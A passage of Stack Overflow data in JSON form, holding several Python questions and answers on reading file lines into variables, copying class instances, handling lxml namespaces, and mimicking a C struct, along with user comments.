"display_name": "dipayan", "link": "https://stackoverflow.com/users/2069574/dipayan"}, "edited": false, "score": 0, "creation_date": 1427948185, "post_id": 29398803, "comment_id": 46984642, "body": "@DipayanDev you can&#39;t paste code into the comments like that, try &quot;editing&quot; it into your question instead"}, {"owner": {"reputation": 1671, "user_id": 4669462, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/03fub.jpg?s=128&g=1", "display_name": "logic", "link": "https://stackoverflow.com/users/4669462/logic"}, "reply_to_user": {"reputation": 136, "user_id": 2069574, "user_type": "registered", "accept_rate": 70, "profile_image": "https://graph.facebook.com/10205166405618379/picture?type=large", "display_name": "dipayan", "link": "https://stackoverflow.com/users/2069574/dipayan"}, "edited": false, "score": 0, "creation_date": 1427948785, "post_id": 29398803, "comment_id": 46984789, "body": "@DipayanDev Instead of using a while-loop, use a for-loop. For example, <code>for i in range(0,len(n)): if n[i]!=a:</code> ... same thing with the next while. Replace them with a for loop and an if statement. This is because you increment <code>i</code> past the number of elements in the lists <code>n</code> and <code>m</code>"}, {"owner": {"reputation": 136, "user_id": 2069574, "user_type": "registered", "accept_rate": 70, "profile_image": "https://graph.facebook.com/10205166405618379/picture?type=large", "display_name": "dipayan", "link": "https://stackoverflow.com/users/2069574/dipayan"}, "edited": false, "score": 0, "creation_date": 1427949177, "post_id": 29398803, "comment_id": 46984895, "body": "Edited the question again with for loop.  Same error showing in if n[i]!=a."}, {"owner": {"reputation": 1671, "user_id": 4669462, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/03fub.jpg?s=128&g=1", "display_name": "logic", "link": "https://stackoverflow.com/users/4669462/logic"}, "reply_to_user": {"reputation": 136, "user_id": 2069574, "user_type": "registered", "accept_rate": 70, "profile_image": "https://graph.facebook.com/10205166405618379/picture?type=large", "display_name": "dipayan", "link": "https://stackoverflow.com/users/2069574/dipayan"}, "edited": false, "score": 0, "creation_date": 1427980590, "post_id": 29398803, "comment_id": 47000491, "body": "@DipayanDev Accept an answer for this question and post a new question. Because the question you have now is not relevant to the one that was asked earlier."}], "tags": [], "owner": {"reputation": 1671, "user_id": 4669462, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/03fub.jpg?s=128&g=1", "display_name": "logic", "link": "https://stackoverflow.com/users/4669462/logic"}, "is_accepted": false, "score": 0, "last_activity_date": 1427947957, "last_edit_date": 1427947957, "creation_date": 1427915158, "answer_id": 29398803, "question_id": 29398373, "link": "https://stackoverflow.com/questions/29398373/how-to-store-values-of-a-particular-line-of-a-text-file-in-separate-variables-in/29398803#29398803", "title": "How to store values of a particular line of a text file in separate variables in Python", "body": "<p>Your problem lies with the fact that <code>a,b=fin.readline()</code> would execute <code>fin.readline()</code> twice, giving you <code>a = 'f,k'</code> and <code>b = '.'</code> (which is the following line that is read) </p>\n\n<p>To prevent this, you could assign the previous line to a variable and <em>then</em> split it into variables <code>a</code> and <code>b</code>. </p>\n\n<p>For example:</p>\n\n<pre><code>filename = 'input.txt'    \nfin = open(filename )\nn=fin.readline().split()\nm=fin.readline().split()\nline=(fin.readline())\na,b=line.split(',')\nb=b.strip()\n</code></pre>\n\n<p>Or a more simplified approach using <code>with open</code>:</p>\n\n<pre><code>with open('input.txt') as fin:\n    n=fin.readline().split()\n    m=fin.readline().split()\n    line=(fin.readline())\n    a,b=line.split(',')\n    b=b.strip()\n</code></pre>\n\n<p>Both of these approches would yield the output:</p>\n\n<pre><code>&gt;&gt;&gt; n\n['a,b,c,d,e,f,g,h']\n\n&gt;&gt;&gt; m\n['a,b,c,i,j,k,l,m']\n\n&gt;&gt;&gt; a\n'f'\n\n&gt;&gt;&gt; b\n'k'\n</code></pre>\n"}], "owner": {"reputation": 136, "user_id": 2069574, "user_type": "registered", "accept_rate": 70, "profile_image": "https://graph.facebook.com/10205166405618379/picture?type=large", "display_name": "dipayan", "link": "https://stackoverflow.com/users/2069574/dipayan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1060, "favorite_count": 0, "answer_count": 3, "score": 1, "last_activity_date": 1431107603, "creation_date": 1427913707, "last_edit_date": 1431107603, "question_id": 29398373, "link": "https://stackoverflow.com/questions/29398373/how-to-store-values-of-a-particular-line-of-a-text-file-in-separate-variables-in", "title": "How to store values of a particular line of a text file in separate variables in Python", "body": "<p>I have a text file , which reads this.</p>\n\n<pre><code>a,b,c,d,e,f,g,h    \na,b,c,i,j,k,l,m    \nf,k\n</code></pre>\n\n<p>Now, I want to store the first line as a list, second list in other list. But the third two values, I want to store in some particular variables say a=f, b=k.</p>\n\n<p>I have made the code, but its showing error during reading the third line.\nPlease someone help this.</p>\n\n<p>Here is my code.</p>\n\n<pre><code>filename = 'input.txt'     \nfin=open(filename,'r')    \nn=fin.readline()    \nm=fin.readline()    \na,b=fin.readline()\n</code></pre>\n\n<p>UPDATE:</p>\n\n<pre><code>with open('input.txt') as fin:\n    n=fin.readline().split()\n    m=fin.readline().split()\n\n    line=(fin.readline())\n\na,b=line[0],line[2]\n\ni=0\n\nfor i in range(0,len(n)): \n    if n[i]!=a:\n        i+=1\n    cp=i-1\n\ni=0\nfor i in range(0,len(n)): \n    if n[i]!=a:\n        i+=1\n    posa=i-1\n\ni=0\nfor i in range(0,len(n)): \n    if m[i]!=b:\n        i+=1\n    posb=i-1\n\nwhile(posa&gt;cp):\n    posa-=1\n\nwhile(posa&gt;cp):\n    posb-=1\n\nif(cp&lt;0):\n    print(\"No Common Predecessor\")\n\nelif (posa&lt;posb):\n    if(posa&lt;0):\n        posa=0\n    print(\"Common Predecessor: %s\" %n[posa])\n\nelse:\n    if(posb&lt;0):\n        posb=0\n    print(\"Common Predecessor: %s\" %m[posb])\n</code></pre>\n"}, {"tags": ["python", "python-3.x"], "comments": [{"owner": {"reputation": 262567, "user_id": 748858, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/17gYz.png?s=128&g=1", "display_name": "mgilson", "link": "https://stackoverflow.com/users/748858/mgilson"}, "edited": false, "score": 1, "creation_date": 1427913678, "post_id": 29398336, "comment_id": 46972656, "body": "Can you use <a href=\"https://docs.python.org/3.3/library/copy.html#copy.copy\" rel=\"nofollow noreferrer\"><code>copy.copy()</code></a>?"}, {"owner": {"reputation": 805, "user_id": 4739548, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/h49dm.png?s=128&g=1", "display_name": "ASCIIThenANSI", "link": "https://stackoverflow.com/users/4739548/asciithenansi"}, "reply_to_user": {"reputation": 262567, "user_id": 748858, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/17gYz.png?s=128&g=1", "display_name": "mgilson", "link": "https://stackoverflow.com/users/748858/mgilson"}, "edited": false, "score": 0, "creation_date": 1427913780, "post_id": 29398336, "comment_id": 46972721, "body": "That worked perfectly. Thanks!"}, {"owner": {"reputation": 17238, "user_id": 240490, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/536433ff8bf7f50dcab75a920a11d30a?s=128&d=identicon&r=PG", "display_name": "Jonathan Eunice", "link": "https://stackoverflow.com/users/240490/jonathan-eunice"}, "edited": false, "score": 0, "creation_date": 1427913949, "post_id": 29398336, "comment_id": 46972804, "body": "Um...it probably didn&#39;t work so well. Test: <code>copy.copy(CustomClass) is CustomClass</code>. The answer is <code>True</code>. I.e., no copy was made. It&#39;s handing you back the same object."}, {"owner": {"reputation": 805, "user_id": 4739548, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/h49dm.png?s=128&g=1", "display_name": "ASCIIThenANSI", "link": "https://stackoverflow.com/users/4739548/asciithenansi"}, "reply_to_user": {"reputation": 17238, "user_id": 240490, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/536433ff8bf7f50dcab75a920a11d30a?s=128&d=identicon&r=PG", "display_name": "Jonathan Eunice", "link": "https://stackoverflow.com/users/240490/jonathan-eunice"}, "edited": false, "score": 0, "creation_date": 1427914370, "post_id": 29398336, "comment_id": 46973037, "body": "@JonathanEunice What I used was <code>object = CustomClass(&#39;foo&#39;)</code> and then on the next line <code>new_copy = copy.copy(object)</code>. This makes a copy of the variable, which is what I wanted. For example, if I use that and then write <code>object.thing = &#39;bar&#39;</code>, <code>new_copy.thing</code> remains <code>&#39;foo&#39;</code>."}], "answers": [{"comments": [{"owner": {"reputation": 17238, "user_id": 240490, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/536433ff8bf7f50dcab75a920a11d30a?s=128&d=identicon&r=PG", "display_name": "Jonathan Eunice", "link": "https://stackoverflow.com/users/240490/jonathan-eunice"}, "edited": false, "score": 0, "creation_date": 1427914073, "post_id": 29398459, "comment_id": 46972866, "body": "Very true in general. But when the object in question is a class, no bueno. Even <code>copy.deepcopy(CustomClass) is CustomClass</code>. I.e., no copy is made. It&#39;s handing you back the same object."}, {"owner": {"reputation": 881859, "user_id": 100297, "user_type": "moderator", "profile_image": "https://www.gravatar.com/avatar/24780fb6df85a943c7aea0402c843737?s=128&d=identicon&r=PG", "display_name": "Martijn Pieters", "link": "https://stackoverflow.com/users/100297/martijn-pieters"}, "reply_to_user": {"reputation": 17238, "user_id": 240490, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/536433ff8bf7f50dcab75a920a11d30a?s=128&d=identicon&r=PG", "display_name": "Jonathan Eunice", "link": "https://stackoverflow.com/users/240490/jonathan-eunice"}, "edited": false, "score": 0, "creation_date": 1427914121, "post_id": 29398459, "comment_id": 46972894, "body": "@JonathanEunice: that&#39;s because classes are meant to be singletons."}, {"owner": {"reputation": 881859, "user_id": 100297, "user_type": "moderator", "profile_image": "https://www.gravatar.com/avatar/24780fb6df85a943c7aea0402c843737?s=128&d=identicon&r=PG", "display_name": "Martijn Pieters", "link": "https://stackoverflow.com/users/100297/martijn-pieters"}, "reply_to_user": {"reputation": 17238, "user_id": 240490, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/536433ff8bf7f50dcab75a920a11d30a?s=128&d=identicon&r=PG", "display_name": "Jonathan Eunice", "link": "https://stackoverflow.com/users/240490/jonathan-eunice"}, "edited": false, "score": 0, "creation_date": 1427914133, "post_id": 29398459, "comment_id": 46972899, "body": "@JonathanEunice: use subclassing if you need distinct classes."}, {"owner": {"reputation": 17238, "user_id": 240490, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/536433ff8bf7f50dcab75a920a11d30a?s=128&d=identicon&r=PG", "display_name": "Jonathan Eunice", "link": "https://stackoverflow.com/users/240490/jonathan-eunice"}, "edited": false, "score": 0, "creation_date": 1427914145, "post_id": 29398459, "comment_id": 46972908, "body": "Exactly. Therefore, copies are not possible. The OP asked for a copy of a class. They can copy instances, but they cannot copy classes."}, {"owner": {"reputation": 881859, "user_id": 100297, "user_type": "moderator", "profile_image": "https://www.gravatar.com/avatar/24780fb6df85a943c7aea0402c843737?s=128&d=identicon&r=PG", "display_name": "Martijn Pieters", "link": "https://stackoverflow.com/users/100297/martijn-pieters"}, "reply_to_user": {"reputation": 17238, "user_id": 240490, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/536433ff8bf7f50dcab75a920a11d30a?s=128&d=identicon&r=PG", "display_name": "Jonathan Eunice", "link": "https://stackoverflow.com/users/240490/jonathan-eunice"}, "edited": false, "score": 0, "creation_date": 1427914249, "post_id": 29398459, "comment_id": 46972971, "body": "@JonathanEunice: I think the OP is being imprecise about vocabulary here. There is an <code>__init__</code> with a sample instance attribute; I think they are creating copies of instances here."}, {"owner": {"reputation": 17238, "user_id": 240490, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/536433ff8bf7f50dcab75a920a11d30a?s=128&d=identicon&r=PG", "display_name": "Jonathan Eunice", "link": "https://stackoverflow.com/users/240490/jonathan-eunice"}, "edited": false, "score": 0, "creation_date": 1427914342, "post_id": 29398459, "comment_id": 46973021, "body": "Perhaps you&#39;re right. If it&#39;s instances they want to copy, the <code>copy</code> module is dead-on."}, {"owner": {"reputation": 881859, "user_id": 100297, "user_type": "moderator", "profile_image": "https://www.gravatar.com/avatar/24780fb6df85a943c7aea0402c843737?s=128&d=identicon&r=PG", "display_name": "Martijn Pieters", "link": "https://stackoverflow.com/users/100297/martijn-pieters"}, "reply_to_user": {"reputation": 17238, "user_id": 240490, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/536433ff8bf7f50dcab75a920a11d30a?s=128&d=identicon&r=PG", "display_name": "Jonathan Eunice", "link": "https://stackoverflow.com/users/240490/jonathan-eunice"}, "edited": false, "score": 0, "creation_date": 1427914425, "post_id": 29398459, "comment_id": 46973073, "body": "@JonathanEunice: you have confirmation in the comments on the question; this is about instances."}, {"owner": {"reputation": 805, "user_id": 4739548, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/h49dm.png?s=128&g=1", "display_name": "ASCIIThenANSI", "link": "https://stackoverflow.com/users/4739548/asciithenansi"}, "edited": false, "score": 0, "creation_date": 1427914428, "post_id": 29398459, "comment_id": 46973074, "body": "Thanks a lot! This really helps."}, {"owner": {"reputation": 17238, "user_id": 240490, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/536433ff8bf7f50dcab75a920a11d30a?s=128&d=identicon&r=PG", "display_name": "Jonathan Eunice", "link": "https://stackoverflow.com/users/240490/jonathan-eunice"}, "edited": false, "score": 0, "creation_date": 1427914569, "post_id": 29398459, "comment_id": 46973148, "body": "@MartijnPieters question edited to reflect that it is instances, not classes, that are being copied."}], "tags": [], "owner": {"reputation": 881859, "user_id": 100297, "user_type": "moderator", "profile_image": "https://www.gravatar.com/avatar/24780fb6df85a943c7aea0402c843737?s=128&d=identicon&r=PG", "display_name": "Martijn Pieters", "link": "https://stackoverflow.com/users/100297/martijn-pieters"}, "is_accepted": true, "score": 9, "last_activity_date": 1427914224, "last_edit_date": 1427914224, "creation_date": 1427913980, "answer_id": 29398459, "question_id": 29398336, "link": "https://stackoverflow.com/questions/29398336/how-to-copy-instances-of-a-custom-defined-class-in-python-3-3/29398459#29398459", "title": "How to copy instances of a custom defined class in Python 3.3?", "body": "<p>In general, you can use the <a href=\"https://docs.python.org/2/library/copy.html\" rel=\"noreferrer\"><code>copy</code> module</a> to produce copies of Python objects.</p>\n\n<ul>\n<li><p><code>copy.copy()</code> will produce a <em>shallow</em> copy; a new instance is created but all attributes are simply copied over. If any of your attributes are mutable and you mutate those objects you'll see those changes reflected on both objects.</p></li>\n<li><p><code>copy.deepcopy()</code> will produce a copy recursively; any mutable objects will themselves be cloned.</p></li>\n</ul>\n\n<p>If your class implements a <code>__copy__</code> method it'll be used to create a shallow copy of the object; return a new instance with attributes copied over and altered as needed.</p>\n\n<p>Similarly, you can implement a <code>__deepcopy__</code> method to implement a custom deep copy method; it'll be passed the <code>memo</code> state, pass this on to recursive <code>copy.deepcopy()</code> calls.</p>\n\n<p>Note that you cannot use this to copy a <em>class object</em> however. Classes are meant to be <em>singletons</em>; you don't need to create a copy in that case. You can use <em>subclassing</em> instead, or a class factory function, to produce distinct class objects.</p>\n"}], "owner": {"reputation": 805, "user_id": 4739548, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/h49dm.png?s=128&g=1", "display_name": "ASCIIThenANSI", "link": "https://stackoverflow.com/users/4739548/asciithenansi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 5872, "favorite_count": 1, "accepted_answer_id": 29398459, "answer_count": 1, "score": 9, "last_activity_date": 1427915649, "creation_date": 1427913574, "last_edit_date": 1427915649, "question_id": 29398336, "link": "https://stackoverflow.com/questions/29398336/how-to-copy-instances-of-a-custom-defined-class-in-python-3-3", "title": "How to copy instances of a custom defined class in Python 3.3?", "body": "<p>I am trying to copy instances of a custom class in Python 3.3, similar to how <code>dict.copy()</code> and <code>list.copy()</code> work. How do I go about this?</p>\n\n<p>Here is an example of my custom class:</p>\n\n<pre><code>class CustomClass(object): # Custom class example\n    def __init__(self, thing):\n        self.thing = thing\n</code></pre>\n"}, {"tags": ["python", "xml", "xml-parsing", "lxml"], "comments": [{"owner": {"reputation": 39281, "user_id": 873165, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/Zjzso.jpg?s=128&g=1", "display_name": "Kevin Workman", "link": "https://stackoverflow.com/users/873165/kevin-workman"}, "edited": false, "score": 0, "creation_date": 1427914311, "post_id": 29398314, "comment_id": 46973002, "body": "The <a href=\"https://stackoverflow.com/questions/tagged/processing\">processing</a> tag should only be used for questions about the Processing language."}, {"owner": {"reputation": 411841, "user_id": 771848, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/2DTBv.jpg?s=128&g=1", "display_name": "alecxe", "link": "https://stackoverflow.com/users/771848/alecxe"}, "reply_to_user": {"reputation": 39281, "user_id": 873165, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/Zjzso.jpg?s=128&g=1", "display_name": "Kevin Workman", "link": "https://stackoverflow.com/users/873165/kevin-workman"}, "edited": false, "score": 0, "creation_date": 1427914580, "post_id": 29398314, "comment_id": 46973153, "body": "@KevinWorkman good point, updated. Thanks."}], "answers": [{"comments": [{"owner": {"reputation": 1047, "user_id": 929732, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/ab07188bfbcf1c804ada347f9391e7ae?s=128&d=identicon&r=PG", "display_name": "BostonMacOSX", "link": "https://stackoverflow.com/users/929732/bostonmacosx"}, "edited": false, "score": 0, "creation_date": 1427919706, "post_id": 29398419, "comment_id": 46975971, "body": "But that doesn&#39;t really answer my question of how do I get the tag names minus the namespace value in the curly braces. Look at my &quot;if&quot; statement on the last line of the python...maybe that will be clearer then."}], "tags": [], "owner": {"reputation": 411841, "user_id": 771848, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/2DTBv.jpg?s=128&g=1", "display_name": "alecxe", "link": "https://stackoverflow.com/users/771848/alecxe"}, "is_accepted": false, "score": 2, "last_activity_date": 1427913863, "last_edit_date": 1495540247, "creation_date": 1427913863, "answer_id": 29398419, "question_id": 29398314, "link": "https://stackoverflow.com/questions/29398314/i-want-to-remove-the-curly-braces-and-xml-namspace-using-lxml-and-just-report-th/29398419#29398419", "title": "I want to remove the curly braces and XML namspace using lxml and just report the tag name", "body": "<p>You need to <strong>handle <a href=\"http://lxml.de/xpathxslt.html#namespaces-and-prefixes\" rel=\"nofollow noreferrer\">namespaces</a></strong>, in your case an <a href=\"https://stackoverflow.com/questions/8053568/how-do-i-use-empty-namespaces-in-an-lxml-xpath-query\">empty one</a>:</p>\n\n<pre><code>from lxml import etree as ET\n\ndata = \"\"\"&lt;?xml version =\"1.0\" encoding=\"UTF-8\" standalone=\"no\" ?&gt;\n&lt;!DOCTYPE fmresultset PUBLIC \"-//FMI//DTD fmresultset//EN\" \"http://localhost:16020/fmi/xml/fmresultset.dtd\"&gt;\n&lt;fmresultset xmlns=\"http://www.filemaker.com/xml/fmresultset\" version=\"1.0\"&gt;\n    &lt;error code=\"0\"&gt;\n    &lt;/error&gt;\n    &lt;product build=\"11/11/2014\" name=\"FileMaker Web Publishing Engine\" version=\"13.0.5.518\"&gt;\n    &lt;/product&gt;\n&lt;/fmresultset&gt;\n\"\"\"\n\nnamespaces = {\n  \"myns\": \"http://www.filemaker.com/xml/fmresultset\"\n}\n\ntree = ET.fromstring(data)\nprint tree.find(\"myns:product\", namespaces=namespaces).attrib.get(\"name\")\n</code></pre>\n\n<p>Prints:</p>\n\n<pre><code>FileMaker Web Publishing Engine\n</code></pre>\n"}], "owner": {"reputation": 1047, "user_id": 929732, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/ab07188bfbcf1c804ada347f9391e7ae?s=128&d=identicon&r=PG", "display_name": "BostonMacOSX", "link": "https://stackoverflow.com/users/929732/bostonmacosx"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1218, "favorite_count": 0, "answer_count": 1, "score": 3, "last_activity_date": 1427914572, "creation_date": 1427913516, "last_edit_date": 1427914572, "question_id": 29398314, "link": "https://stackoverflow.com/questions/29398314/i-want-to-remove-the-curly-braces-and-xml-namspace-using-lxml-and-just-report-th", "title": "I want to remove the curly braces and XML namspace using lxml and just report the tag name", "body": "<p>So I have the following XML document It is much longer:</p>\n\n<pre><code>&lt;?xml version =\"1.0\" encoding=\"UTF-8\" standalone=\"no\" ?&gt;\n&lt;!DOCTYPE fmresultset PUBLIC \"-//FMI//DTD fmresultset//EN\" \"http://localhost:16020/fmi/xml/fmresultset.dtd\"&gt;\n&lt;fmresultset xmlns=\"http://www.filemaker.com/xml/fmresultset\" version=\"1.0\"&gt;\n&lt;error code=\"0\"&gt;\n&lt;/error&gt;\n&lt;product build=\"11/11/2014\" name=\"FileMaker Web Publishing Engine\" version=\"13.0.5.518\"&gt;\n&lt;/product&gt;\n</code></pre>\n\n<p>I use the following python to extract some of the tag names:</p>\n\n<pre><code>doc = etree.fromstring(resulttxt)\nprint( doc.attrib)\nprint(doc.tag)\nprint(doc[4][0][0].tag)\nif(doc[4][0][0].tag == 'field'):\n    print 'hi'\n</code></pre>\n\n<p>What I'm getting though is: </p>\n\n<pre><code>{'version': '1.0'}\n{http://www.filemaker.com/xml/fmresultset}fmresultset\n{http://www.filemaker.com/xml/fmresultset}field\n</code></pre>\n\n<p>The xmlns doesn't show up as an attribute of the root tag but it is there. </p>\n\n<p>And it is placed in front of each tag name which makes it difficult to loop through and use conditionals. I want doc.tag just to show the tag and not the namespace and the tag.</p>\n\n<p>This is day 1 for me using this. could anyone help out?</p>\n"}, {"tags": ["python"], "comments": [{"owner": {"reputation": 69452, "user_id": 953482, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/T3HH6.png?s=128&g=1", "display_name": "Kevin", "link": "https://stackoverflow.com/users/953482/kevin"}, "edited": false, "score": 0, "creation_date": 1427913518, "post_id": 29398285, "comment_id": 46972554, "body": "Python doesn&#39;t have structs."}, {"owner": {"reputation": 96896, "user_id": 2296458, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/wbG2s.png?s=128&g=1", "display_name": "Cory Kramer", "link": "https://stackoverflow.com/users/2296458/cory-kramer"}, "reply_to_user": {"reputation": 69452, "user_id": 953482, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/T3HH6.png?s=128&g=1", "display_name": "Kevin", "link": "https://stackoverflow.com/users/953482/kevin"}, "edited": false, "score": 0, "creation_date": 1427913866, "post_id": 29398285, "comment_id": 46972762, "body": "@Kevin It basically does. A <code>struct</code> is just a <code>class</code> where all the members and methods are <code>public</code> instead of <code>private</code> by default. In fact in this regard Python&#39;s classes are closer to C&#39;s <code>struct</code> than <code>class</code> since there isn&#39;t a notion of <code>private</code>"}, {"owner": {"reputation": 97835, "user_id": 355230, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/VjcbL.jpg?s=128&g=1", "display_name": "martineau", "link": "https://stackoverflow.com/users/355230/martineau"}, "reply_to_user": {"reputation": 96896, "user_id": 2296458, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/wbG2s.png?s=128&g=1", "display_name": "Cory Kramer", "link": "https://stackoverflow.com/users/2296458/cory-kramer"}, "edited": false, "score": 0, "creation_date": 1427916307, "post_id": 29398285, "comment_id": 46974085, "body": "@Cyber: You&#39;re conflating the languages. In Python, all attributes and methods are public by default (although its concept of public vs private are different from C++&#39;s). C doesn&#39;t have classes, but C++ does, and in C++ a <code>struct</code> is simply a class where all the members and methods are public by default. In C, <code>struct</code>s can&#39;t have methods because they&#39;re not classes since there&#39;s no such thing. C also doesn&#39;t have a concept of public and private."}, {"owner": {"reputation": 96896, "user_id": 2296458, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/wbG2s.png?s=128&g=1", "display_name": "Cory Kramer", "link": "https://stackoverflow.com/users/2296458/cory-kramer"}, "reply_to_user": {"reputation": 97835, "user_id": 355230, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/VjcbL.jpg?s=128&g=1", "display_name": "martineau", "link": "https://stackoverflow.com/users/355230/martineau"}, "edited": false, "score": 0, "creation_date": 1427916474, "post_id": 29398285, "comment_id": 46974181, "body": "@martineau My mistake, I meant to write C++ in my comment above. But you are correct in your explanation."}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 4739545, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/50ade13e58d80ac38d4c4003861de004?s=128&d=identicon&r=PG&f=1", "display_name": "Benjer", "link": "https://stackoverflow.com/users/4739545/benjer"}, "edited": false, "score": 0, "creation_date": 1427915286, "post_id": 29398394, "comment_id": 46973573, "body": "where is it mentioned that m is an integer?  How does python know wether it is is an integer or not ?"}, {"owner": {"reputation": 96896, "user_id": 2296458, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/wbG2s.png?s=128&g=1", "display_name": "Cory Kramer", "link": "https://stackoverflow.com/users/2296458/cory-kramer"}, "reply_to_user": {"reputation": 11, "user_id": 4739545, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/50ade13e58d80ac38d4c4003861de004?s=128&d=identicon&r=PG&f=1", "display_name": "Benjer", "link": "https://stackoverflow.com/users/4739545/benjer"}, "edited": false, "score": 1, "creation_date": 1427915328, "post_id": 29398394, "comment_id": 46973588, "body": "@Benjer <code>m</code> will be whatever type you assign to it. I happened to put <code>int</code> values in there, but you can put anything. Python is not a statically-typed language."}, {"owner": {"reputation": 11, "user_id": 4739545, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/50ade13e58d80ac38d4c4003861de004?s=128&d=identicon&r=PG&f=1", "display_name": "Benjer", "link": "https://stackoverflow.com/users/4739545/benjer"}, "edited": false, "score": 0, "creation_date": 1427915425, "post_id": 29398394, "comment_id": 46973643, "body": "Sorry, im pretty new to pyhton, so basically the strucutre doent have a max value assigned to it, and any element can be put into it? Is there a way to only allow integers?"}, {"owner": {"reputation": 96896, "user_id": 2296458, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/wbG2s.png?s=128&g=1", "display_name": "Cory Kramer", "link": "https://stackoverflow.com/users/2296458/cory-kramer"}, "reply_to_user": {"reputation": 11, "user_id": 4739545, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/50ade13e58d80ac38d4c4003861de004?s=128&d=identicon&r=PG&f=1", "display_name": "Benjer", "link": "https://stackoverflow.com/users/4739545/benjer"}, "edited": false, "score": 0, "creation_date": 1427915524, "post_id": 29398394, "comment_id": 46973699, "body": "Yes the <code>list</code> (analogous to your <code>stack</code>) is a Python sequence. Meaning it is sortable, indexable, resizeable, sliceable, etc. In that regard it is similar to a <code>std::vector&lt;T&gt;</code> in <code>C++</code>, but it is also heterogeneous. The way to limit the values to <code>int</code> would be to do some kind of validation using <code>isinstance(m, int)</code> or something like that."}], "tags": [], "owner": {"reputation": 96896, "user_id": 2296458, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/wbG2s.png?s=128&g=1", "display_name": "Cory Kramer", "link": "https://stackoverflow.com/users/2296458/cory-kramer"}, "is_accepted": false, "score": 2, "last_activity_date": 1427913783, "creation_date": 1427913783, "answer_id": 29398394, "question_id": 29398285, "link": "https://stackoverflow.com/questions/29398285/how-would-this-c-struct-be-translated-into-python/29398394#29398394", "title": "How would this C struct be translated into Python", "body": "<p>You just need to define your <code>dataT</code> class</p>\n\n<pre><code>class dataT():\n    def __init__(self, m=0):\n        self.m = m\n</code></pre>\n\n<p>You can instantiate one like</p>\n\n<pre><code>d = dataT(5)\n</code></pre>\n\n<p>The <code>stack</code> behavior you can get from the <code>list</code> class already</p>\n\n<pre><code>&gt;&gt;&gt; l = [dataT(i) for i in range(5)]\n&gt;&gt;&gt; l.pop().m\n4\n&gt;&gt;&gt; l.pop().m\n3\n&gt;&gt;&gt; l.pop().m\n2\n&gt;&gt;&gt; l.pop().m\n1\n&gt;&gt;&gt; l.pop().m\n0\n&gt;&gt;&gt; l.append(dataT(3))\n&gt;&gt;&gt; l.pop().m\n3\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 97835, "user_id": 355230, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/VjcbL.jpg?s=128&g=1", "display_name": "martineau", "link": "https://stackoverflow.com/users/355230/martineau"}, "edited": false, "score": 0, "creation_date": 1427916449, "post_id": 29399054, "comment_id": 46974169, "body": "A possibly very significant difference between C <code>struct</code>s and Python <code>namedtuple</code>s is that the latter are immutable."}, {"owner": {"reputation": 26111, "user_id": 2750492, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fTVM8.jpg?s=128&g=1", "display_name": "AChampion", "link": "https://stackoverflow.com/users/2750492/achampion"}, "reply_to_user": {"reputation": 97835, "user_id": 355230, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/VjcbL.jpg?s=128&g=1", "display_name": "martineau", "link": "https://stackoverflow.com/users/355230/martineau"}, "edited": false, "score": 0, "creation_date": 1427926714, "post_id": 29399054, "comment_id": 46979193, "body": "C struct&#39;s are mutable too, e.g. <code>st.top = 1</code> would update <code>st</code> in place."}, {"owner": {"reputation": 97835, "user_id": 355230, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/VjcbL.jpg?s=128&g=1", "display_name": "martineau", "link": 